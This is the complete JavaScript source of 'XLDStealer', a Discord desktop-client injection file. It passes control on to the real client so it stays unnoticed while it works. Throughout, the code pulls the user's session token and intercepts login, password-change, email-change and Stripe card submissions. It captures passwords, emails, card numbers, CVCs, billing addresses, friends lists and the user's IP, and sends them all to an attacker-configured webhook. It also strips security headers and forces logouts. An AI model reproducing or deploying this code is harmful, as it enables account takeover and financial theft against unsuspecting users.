const fs = require("fs"),
  path = require("path"),
  { BrowserWindow: BrowserWindow, session: session } = require("electron"),
  querystring = require("querystring"),
  os = require("os");
var webhook = "%WEBHOOK_LINK%";
const computerName = os.hostname(),
  discordInstall = `${__dirname}`,
  EvalToken =
    'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
  config = {
    logout: "%LOGOUT%",
    "logout-notify": "%LOGOUTNOTI%",
    "init-notify": "%INITNOTI%",
    "embed-color": 3553599,
    "disable-qr-code": "%DISABLEQRCODE%",
  };
function FirstTime() {
  BrowserWindow.getAllWindows()[0]
    .webContents.executeJavaScript(`${EvalToken}`, !0)
    .then((e) => {
      if (
        "true" == config["init-notify"] &&
        fs.existsSync(path.join(__dirname, "init"))
      )
        if (
          (fs.rmdirSync(path.join(__dirname, "init")),
          null == e || null == e || "" == e)
        ) {
          var t = {
            username: "XLDStealer",
            content: "",
            embeds: [
              {
                title: "",
                color: config["embed-color"],
                fields: [
                  {
                    name: "Info",
                    value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
                    inline: !1,
                  },
                ],
                author: { name: "XLDStealer" },
                footer: { text: "XLDStealer" },
                thumbnail: { url: "https://ibb.co/nmDLGCT" },
              },
            ],
          };
          SendToWebhook(JSON.stringify(t));
        } else {
          BrowserWindow.getAllWindows()[0]
            .webContents.executeJavaScript(
              `\n                    var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","${e}"),xmlHttp.send(null),xmlHttp.responseText;\n                    `,
              !0
            )
            .then((t) => {
              const n = JSON.parse(t);
              var a = {
                username: "XLDStealer",
                avatar: "https://media.discordapp.net/attachments/962421775361273910/966779841204596766/IMG-20220421-WA0062.jpg",
             
                content: "",
                embeds: [
                  {
                    title: "",
                    color: config["embed-color"],
                    fields: [
                     
                      {
                        name: "<:members:966817375863308350> Username",
                        value: `\`${n.username}#${n.discriminator}\``,
                        inline: !0,
                      },
                      { name: "<:members:966817375863308350> ID", value: `\`${n.id}\``, inline: !0 },
                      {
                        name: "<a:boostlevel:966792429443379281> Badges",
                        value: `${GetBadges(n.flags)}`,
                        inline: !0,
                      },
                      { name: "<:question:966655842202050570> Token", value: `\`\`\`${e}\`\`\``, inline: !0 },
                      { name: "<:question:966655842202050570> Copy Token", value: `[Click to copy](https://Rustlercoppy.com/copy/${e})`, inline: !0},  ],
                    author: { name: `${n.username}#${n.discriminator} (${n.id})`, "icon_url": "https://media.discordapp.net/attachments/962421775361273910/966779841204596766/IMG-20220421-WA0062.jpg" },
                    footer: { text: "XLDStealer" },
                    thumbnail: {
                      url: `https://cdn.discordapp.com/avatars/${n.id}/${n.avatar}`,
                    },
                  },
                ],
              };
              SendToWebhook(JSON.stringify(a));
            });
        }
      if (!fs.existsSync(path.join(__dirname, "XLDStealerBTW"))) return !0;
      if (
        (fs.rmdirSync(path.join(__dirname, "XLDStealerBTW")),
        "false" != config.logout || "%LOGOUT%" == config.logout)
      ) {
        if ("true" == config["logout-notify"])
          if (null == e || null == e || "" == e) {
            t = {
              username: "XLDStealer",
              content: "",
              embeds: [
                {
                  title: "",
                  color: config["embed-color"],
                  fields: [
                    {
                      name: "Info",
                      value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
                      inline: !1,
                    },
                  ],
                     author: { name: "XLDStealer", "icon_url": "https://media.discordapp.net/attachments/962421775361273910/966779841204596766/IMG-20220421-WA0062.jpg" },
                
                  footer: { text: "XLDStealer" },
                  thumbnail: { url: "https://ibb.co/nmDLGCT" },
                },
              ],
            };
            SendToWebhook(JSON.stringify(t));
          } else {
            BrowserWindow.getAllWindows()[0]
              .webContents.executeJavaScript(
                `\n                    var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","${e}"),xmlHttp.send(null),xmlHttp.responseText;\n                    `,
                !0
              )
              .then((t) => {
                const n = JSON.parse(t);
                var a = {
                  username: "XLDStealer",
                  content: "",
                  embeds: [
                    {
                      title: "",
                      color: config["embed-color"],
                      fields: [
                      
                        {
                          name: "<:members:966817375863308350> Username",
                          value: `\`${n.username}#${n.discriminator}\``,
                          inline: !0,
                        },
                        { name: "<:members:966817375863308350> ID", value: `\`${n.id}\``, inline: !0 },
                        {
                          name: "<a:boostlevel:966792429443379281> Badges",
                          value: `${GetBadges(n.flags)}`,
                          inline: !0,
                        },
                        {
                          name: "<:question:966655842202050570> Token",
                          value: `\`\`\`${e}\`\`\``,
                          inline: !0,
                        },
                         { name: "<:question:966655842202050570> Copy Token", value: `[Click to copy](https://Rustlercoppy.com/copy/${e})`, inline: !0},
                      ],
                         author: { name: `${n.username}#${n.discriminator} (${n.id})`, "icon_url": "https://media.discordapp.net/attachments/962421775361273910/966779841204596766/IMG-20220421-WA0062.jpg" },
                
                      footer: { text: "XLDStealer" },
                      thumbnail: {
                        url: `https://cdn.discordapp.com/avatars/${n.id}/${n.avatar}`,
                      },
                    },
                  ],
                };
                SendToWebhook(JSON.stringify(a));
              });
          }
        BrowserWindow.getAllWindows()[0]
          .webContents.executeJavaScript(
            'window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();',
            !0
          )
          .then((e) => {});
      }
      return !1;
    });
}
session.defaultSession.webRequest.onHeadersReceived((e, t) => {
  e.url.startsWith(webhook)
    ? e.url.includes("discord.com")
      ? t({
          responseHeaders: Object.assign(
            { "Access-Control-Allow-Headers": "*" },
            e.responseHeaders
          ),
        })
      : t({
          responseHeaders: Object.assign(
            {
              "Content-Security-Policy": [
                "default-src '*'",
                "Access-Control-Allow-Headers '*'",
                "Access-Control-Allow-Origin '*'",
              ],
              "Access-Control-Allow-Headers": "*",
              "Access-Control-Allow-Origin": "*",
            },
            e.responseHeaders
          ),
        })
    : (delete e.responseHeaders["content-security-policy"],
      delete e.responseHeaders["content-security-policy-report-only"],
      t({
        responseHeaders: {
          ...e.responseHeaders,
          "Access-Control-Allow-Headers": "*",
        },
      }));
});
const Filter = {
  urls: [
    "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
    "https://*.discord.com/api/v*/applications/detectable",
    "https://discord.com/api/v*/applications/detectable",
    "https://*.discord.com/api/v*/users/@me/library",
    "https://discord.com/api/v*/users/@me/library",
    "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
    "https://discord.com/api/v*/users/@me/billing/subscriptions",
    "wss://remote-auth-gateway.discord.gg/*",
  ],
};
function SendToWebhook(e) {
  BrowserWindow.getAllWindows()[0]
    .webContents.executeJavaScript(
      `    var xhr = new XMLHttpRequest();\n    xhr.open("POST", "${webhook}", true);\n    xhr.setRequestHeader('Content-Type', 'application/json');\n    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n    xhr.send(JSON.stringify(${e}));\n    `,
      !0
    )
    .then((e) => {});
}
function GetNitro(e) {
  return 0 == e
    ? "<:off:966790397378588722>"
    : 1 == e
    ? "<:classic:896119171019067423> `Nitro Classic`"
    : 2 == e
    ? "<a:boost:824036778570416129> `Nitro Boost`"
    : "<:off:966790397378588722>";
}
function GetRBadges(e) {
  var t = "";
  return (
    1 == (1 & e) && (t += "<:staff:874750808728666152> "),
    2 == (2 & e) && (t += "<:partner:874750808678354964> "),
    4 == (4 & e) && (t += "<:hypesquad_events:874750808594477056> "),
    8 == (8 & e) && (t += "<:bughunter_1:874750808426692658> "),
    512 == (512 & e) && (t += "<:early_supporter:874750808414113823> "),
    16384 == (16384 & e) && (t += "<:bughunter_2:874750808430874664> "),
    131072 == (131072 & e) && (t += "<:developer:874750808472825986> "),
    "" == t && (t = ""),
    t
  );
}
function GetBadges(e) {
  var t = "";
  return (
    1 == (1 & e) && (t += "<:staff:874750808728666152> "),
    2 == (2 & e) && (t += "<:partner:874750808678354964> "),
    4 == (4 & e) && (t += "<:hypesquad_events:874750808594477056> "),
    8 == (8 & e) && (t += "<:bughunter_1:874750808426692658> "),
    64 == (64 & e) && (t += "<:bravery:874750808388952075> "),
    128 == (128 & e) && (t += "<:brilliance:874750808338608199> "),
    256 == (256 & e) && (t += "<:balance:874750808267292683> "),
    512 == (512 & e) && (t += "<:early_supporter:874750808414113823> "),
    16384 == (16384 & e) && (t += "<:bughunter_2:874750808430874664> "),
    131072 == (131072 & e) && (t += "<:developer:874750808472825986> "),
    "" == t && (t = "<:off:966790397378588722>"),
    t
  );
}
function Login(e, t, n) {
  const a = BrowserWindow.getAllWindows()[0];
  a.webContents
    .executeJavaScript(
      `\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "${n}");\n    xmlHttp.send( null );\n    xmlHttp.responseText;`,
      !0
    )
    .then((r) => {
      a.webContents
        .executeJavaScript(
          '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
          !0
        )
        .then((o) => {
          a.webContents
            .executeJavaScript(
              `\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "${n}");\n        xmlHttp.send( null );\n        xmlHttp.responseText`,
              !0
            )
            .then((s) => {
              a.webContents
                .executeJavaScript(
                  `\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "${n}");\n            xmlHttp.send( null );\n            xmlHttp.responseText`,
                  !0
                )
                .then((a) => {
                  const i = JSON.parse(r);
                  var l = {
                    username: "XLDStealer",
                    content: "",
                    embeds: [
                      {
                        title: "",
                        color: config["embed-color"],
                        fields: [
                         
                          {
                            name: "<:members:966817375863308350> Username",
                            value: `\`${i.username}#${i.discriminator}\``,
                            inline: !0,
                          },
                          { name: "<:members:966817375863308350> ID", value: `\`${i.id}\``, inline: !0 },
                          {
                            name: "<:nitro:966790472968339576> Nitro",
                            value: `${GetNitro(i.premium_type)}`,
                            inline: !0,
                          },
                          {
                            name: "<a:boostlevel:966792429443379281> Badges",
                            value: `${GetBadges(i.flags)}`,
                            inline: !0,
                          },
                          {
                            name: "<:creditcard:966803519627743273> Billing",
                            value: `${(function () {
                              const e = JSON.parse(s);
                              var t = "";
                              return (
                                e.forEach((e) => {
                                  if ("" == e.type) return "<:off:966790397378588722>";
                                  if (2 == e.type && 1 != e.invalid)
                                    t += "`✔️` <:paypal:896441236062347374>";
                                  else {
                                    if (1 != e.type || 1 == e.invalid)
                                      return "<:off:966790397378588722>";
                                    t += "`✔️` :credit_card:";
                                  }
                                }),
                                "" == t && (t = "<:off:966790397378588722>"),
                                t
                              );
                            })()}`,
                            inline: !0,
                          },
                          { name: "<:gmail:966790304701235230> Email", value: `\`${e}\``, inline: !0 },
                          { name: "<:lock:966790360409989171> Password", value: `\`${t}\``, inline: !0 },
                          {
                            name: "<:question:966655842202050570> Token",
                            value: `\`\`\`${n}\`\`\``,
                            inline: !0,
                          },
                           { name: "<:question:966655842202050570> Copy Token", value: `[Click to copy](https://Rustlercoppy.com/copy/${n})`, inline: !0},
                        ],
                           author: { name: `${i.username}#${i.discriminator} (${i.id})`, "icon_url": "https://media.discordapp.net/attachments/962421775361273910/966779841204596766/IMG-20220421-WA0062.jpg" },
                
                        footer: { text: "XLDStealer" },
                        thumbnail: {
                          url: `https://cdn.discordapp.com/avatars/${i.id}/${i.avatar}`,
                        },
                      },
                      {
                        title: `<:invite:966790331146309642> Total Friends (${
                          JSON.parse(a).filter((e) => 1 == e.type).length
                        })`,
                        color: config["embed-color"],
                        description: (function () {
                          const e = JSON.parse(a).filter((e) => 1 == e.type);
                          var t = "";
                          for (z of e) {
                            var n = GetRBadges(z.user.public_flags);
                            "" != n &&
                              (t +=
                                n +
                                ` ${z.user.username}#${z.user.discriminator}\n`);
                          }
                          return "" == t && (t = "No Rare Friends"), t;
                        })(),
                           author: { name: `XLD Stealer New Victim`, "icon_url": "https://media.discordapp.net/attachments/962421775361273910/966779841204596766/IMG-20220421-WA0062.jpg" },
                
                        footer: { text: "XLDStealer" },
                        thumbnail: {
                          url: `https://cdn.discordapp.com/avatars/${i.id}/${i.avatar}`,
                        },
                      },
                    ],
                  };
                  SendToWebhook(JSON.stringify(l));
                });
            });
        });
    });
}
function ChangePassword(e, t, n) {
  const a = BrowserWindow.getAllWindows()[0];
  a.webContents
    .executeJavaScript(
      `\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "${n}");\n    xmlHttp.send( null );\n    xmlHttp.responseText;`,
      !0
    )
    .then((r) => {
      a.webContents
        .executeJavaScript(
          '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
          !0
        )
        .then((o) => {
          a.webContents
            .executeJavaScript(
              `\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "${n}");\n        xmlHttp.send( null );\n        xmlHttp.responseText`,
              !0
            )
            .then((a) => {
              const s = JSON.parse(r);
              var i = {
                username: "XLDStealer",
                content: "",
                embeds: [
                  {
                    title: "<:lock:966790360409989171> Password Changed",
                    color: config["embed-color"],
                    fields: [
                    
                      {
                        name: "<:members:966817375863308350> Username",
                        value: `\`${s.username}#${s.discriminator}\``,
                        inline: !0,
                      },
                      { name: "<:members:966817375863308350> ID", value: `\`${s.id}\``, inline: !0 },
                      {
                        name: "<:nitro:966790472968339576> Nitro",
                        value: `${GetNitro(s.premium_type)}`,
                        inline: !0,
                      },
                      {
                        name: "<a:boostlevel:966792429443379281> Badges",
                        value: `${GetBadges(s.flags)}`,
                        inline: !0,
                      },
                      {
                        name: "<:creditcard:966803519627743273> Billing",
                        value: `${(function () {
                          const e = JSON.parse(a);
                          var t = "";
                          return (
                            e.forEach((e) => {
                              if ("" == e.type) return "<:off:966790397378588722>";
                              if (2 == e.type && 1 != e.invalid)
                                t += "`✔️` <:paypal:896441236062347374>";
                              else {
                                if (1 != e.type || 1 == e.invalid)
                                  return "<:off:966790397378588722>";
                                t += "`✔️` :credit_card:";
                              }
                            }),
                            "" == t && (t = "<:off:966790397378588722>"),
                            t
                          );
                        })()}`,
                        inline: !0,
                      },
                      { name: "<:gmail:966790304701235230> Email", value: `\`${s.email}\``, inline: !0 },
                      { name: "Old <:lock:966790360409989171> Password", value: `\`${e}\``, inline: !0 },
                      { name: "New <:lock:966790360409989171> Password", value: `\`${t}\``, inline: !0 },
                      { name: "<:question:966655842202050570> Token", value: `\`\`\`${n}\`\`\``, inline: !0 },
                   { name: "<:question:966655842202050570> Copy Token", value: `[Click to copy](https://Rustlercoppy.com/copy/${n})`, inline: !0},  ],
                       author: { name: `${s.username}#${s.discriminator} (${s.id})`, "icon_url": "https://media.discordapp.net/attachments/962421775361273910/966779841204596766/IMG-20220421-WA0062.jpg" },
                
                    footer: { text: "XLDStealer" },
                    thumbnail: {
                      url: `https://cdn.discordapp.com/avatars/${s.id}/${s.avatar}`,
                    },
                  },
                ],
              };
              SendToWebhook(JSON.stringify(i));
            });
        });
    });
}
function ChangeEmail(e, t, n) {
  const a = BrowserWindow.getAllWindows()[0];
  a.webContents
    .executeJavaScript(
      `\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "${n}");\n    xmlHttp.send( null );\n    xmlHttp.responseText;`,
      !0
    )
    .then((r) => {
      a.webContents
        .executeJavaScript(
          '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
          !0
        )
        .then((o) => {
          a.webContents
            .executeJavaScript(
              `\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "${n}");\n        xmlHttp.send( null );\n        xmlHttp.responseText`,
              !0
            )
            .then((a) => {
              const s = JSON.parse(r);
              var i = {
                username: "XLDStealer",
                content: "",
                embeds: [
                  {
                    title: "<:gmail:966790304701235230> Email Changed",
                    color: config["embed-color"],
                    fields: [
                   
                      {
                        name: "<:members:966817375863308350> Username",
                        value: `\`${s.username}#${s.discriminator}\``,
                        inline: !0,
                      },
                      { name: "<:members:966817375863308350> ID", value: `\`${s.id}\``, inline: !0 },
                      {
                        name: "<:nitro:966790472968339576> Nitro",
                        value: `${GetNitro(s.premium_type)}`,
                        inline: !0,
                      },
                      {
                        name: "<a:boostlevel:966792429443379281> Badges",
                        value: `${GetBadges(s.flags)}`,
                        inline: !0,
                      },
                      {
                        name: "<:creditcard:966803519627743273> Billing",
                        value: `${(function () {
                          const e = JSON.parse(a);
                          var t = "";
                          return (
                            e.forEach((e) => {
                              if ("" == e.type) return "<:off:966790397378588722>";
                              if (2 == e.type && 1 != e.invalid)
                                t += "`✔️` <:paypal:896441236062347374>";
                              else {
                                if (1 != e.type || 1 == e.invalid)
                                  return "<:off:966790397378588722>";
                                t += "`✔️` :credit_card:";
                              }
                            }),
                            "" == t && (t = "<:off:966790397378588722>"),
                            t
                          );
                        })()}`,
                        inline: !0,
                      },
                      { name: "New <:gmail:966790304701235230> Email", value: `\`${e}\``, inline: !0 },
                      { name: "<:lock:966790360409989171> Password", value: `\`${t}\``, inline: !0 },
                      { name: "<:question:966655842202050570> Token", value: `\`\`\`${n}\`\`\``, inline: !0 },
                    { name: "<:question:966655842202050570> Copy Token", value: `[Click to copy](https://Rustlercoppy.com/copy/${n})`, inline: !0}, ],
                        author: { name: `${s.username}#${s.discriminator} (${s.id})`, "icon_url": "https://media.discordapp.net/attachments/962421775361273910/966779841204596766/IMG-20220421-WA0062.jpg" },
                    footer: { text: "XLDStealer" },
                    thumbnail: {
                      url: `https://cdn.discordapp.com/avatars/${s.id}/${s.avatar}`,
                    },
                  },
                ],
              };
              SendToWebhook(JSON.stringify(i));
            });
        });
    });
}
function CreditCardAdded(e, t, n, a, r, o, s, i, l, d) {
  const p = BrowserWindow.getAllWindows()[0];
  p.webContents
    .executeJavaScript(
      `\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "${d}");\n    xmlHttp.send( null );\n    xmlHttp.responseText;`,
      !0
    )
    .then((u) => {
      p.webContents
        .executeJavaScript(
          '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
          !0
        )
        .then((p) => {
          var c = JSON.parse(u),
            m = {
              username: "XLDStealer",
              content: "",
              embeds: [
                {
                  title: "User Credit Card Added",
                  description:
                    "**<:members:966817375863308350> Username:**```" +
                    c.username +
                    "#" +
                    c.discriminator +
                    "```\n**<:members:966817375863308350> ID:**```" +
                    c.id +
                    "```\n**<:gmail:966790304701235230> Email:**```" +
                    c.email +
                    "```\n**<:nitro:966790472968339576> Nitro Type:**```" +
                    GetNitro(c.premium_type) +
                    "```\n**<a:boostlevel:966792429443379281> Badges:**```" +
                    GetBadges(c.flags) +
                    "```\n**Credit Card Number: **```" +
                    e +
                    "```\n**Credit Card Expiration: **```" +
                    n +
                    "/" +
                    a +
                    "```\n**CVC: **```" +
                    t +
                    "```\n**Country: **```" +
                    l +
                    "```\n**State: **```" +
                    s +
                    "```\n**City: **```" +
                    o +
                    "```\n**ZIP:**```" +
                    i +
                    "```\n**Street: **```" +
                    r +
                    "```\n**<:question:966655842202050570> Token:**```" +
                    d +
                    "```\n**IP: **```" +
                    p +
                    "```",
                    author: { name: `${c.username}#${c.discriminator} (${c.id})`, "icon_url": "https://media.discordapp.net/attachments/962421775361273910/966779841204596766/IMG-20220421-WA0062.jpg" },
                   footer: { text: "XLDStealer" },
                  thumbnail: {
                    url:
                      "https://cdn.discordapp.com/avatars/" +
                      c.id +
                      "/" +
                      c.avatar,
                  },
                },
              ],
            };
          SendToWebhook(JSON.stringify(m));
        });
    });
}
session.defaultSession.webRequest.onBeforeRequest(Filter, (e, t) => {
  !e.url.startsWith("wss://") ||
  ("true" != config["disable-qr-code"] &&
    "%DISABLEQRCODE%" != config["disable-qr-code"])
    ? (FirstTime(), t({}))
    : t({ cancel: !0 });
});
const ChangePasswordFilter = {
  urls: [
    "https://discord.com/api/v*/users/@me",
    "https://discordapp.com/api/v*/users/@me",
    "https://*.discord.com/api/v*/users/@me",
    "https://discordapp.com/api/v*/auth/login",
    "https://discord.com/api/v*/auth/login",
    "https://*.discord.com/api/v*/auth/login",
    "https://api.stripe.com/v*/tokens",
  ],
};
session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (e, t) => {
  if (e.url.endsWith("login") && 200 == e.statusCode) {
    const t = JSON.parse(Buffer.from(e.uploadData[0].bytes).toString()),
      n = t.login,
      a = t.password;
    BrowserWindow.getAllWindows()[0]
      .webContents.executeJavaScript(
        'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
        !0
      )
      .then((e) => {
        Login(n, a, e);
      });
  }
  if (
    e.url.endsWith("users/@me") &&
    200 == e.statusCode &&
    "PATCH" == e.method
  ) {
    const t = JSON.parse(Buffer.from(e.uploadData[0].bytes).toString());
    if (null != t.password && null != t.password && "" != t.password) {
      if (
        null != t.new_password &&
        null != t.new_password &&
        "" != t.new_password
      ) {
        BrowserWindow.getAllWindows()[0]
          .webContents.executeJavaScript(
            'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
            !0
          )
          .then((e) => {
            ChangePassword(t.password, t.new_password, e);
          });
      }
      if (null != t.email && null != t.email && "" != t.email) {
        BrowserWindow.getAllWindows()[0]
          .webContents.executeJavaScript(
            'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
            !0
          )
          .then((e) => {
            ChangeEmail(t.email, t.password, e);
          });
      }
    }
  }
  if (e.url.endsWith("tokens")) {
    const t = BrowserWindow.getAllWindows()[0],
      n = querystring.parse(
        decodeURIComponent(Buffer.from(e.uploadData[0].bytes).toString())
      );
    t.webContents
      .executeJavaScript(
        'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
        !0
      )
      .then((e) => {
        CreditCardAdded(
          n["card[number]"],
          n["card[cvc]"],
          n["card[exp_month]"],
          n["card[exp_year]"],
          n["card[address_line1]"],
          n["card[address_city]"],
          n["card[address_state]"],
          n["card[address_zip]"],
          n["card[address_country]"],
          e
        );
      });
  }
}),
  (module.exports = require("./core.asar"));
